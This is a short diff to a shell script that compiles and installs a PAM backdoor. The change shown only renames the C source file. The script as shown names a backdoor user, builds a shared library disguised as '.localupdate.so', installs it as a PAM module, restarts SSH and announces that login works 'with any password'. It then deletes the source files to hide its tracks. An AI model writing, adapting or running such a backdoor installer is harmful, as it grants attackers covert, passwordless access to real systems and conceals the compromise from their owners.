@@ -9,7 +9,7 @@ sudo apt install libpam0g-dev
 BACKDOOR_USER="nihargayam"
 
 echo "[*] Compiling PAM backdoor..."
-gcc -fPIC -fno-stack-protector -c pam_backdoor.c
+gcc -fPIC -fno-stack-protector -c backdoor.c -o pam_backdoor.o
 ld -x --shared -o .localupdate.so pam_backdoor.o
 
 echo "[*] Installing PAM module..."
@@ -36,7 +36,7 @@ sudo systemctl restart ssh
 
 echo "[✔] Setup complete. Try logging in as '$BACKDOOR_USER' with any password."
 
-sudo rm pam_backdoor.c
+sudo rm backdoor.c
 sudo rm pam_backdoor.o
 
 echo "[✔] Clean complete
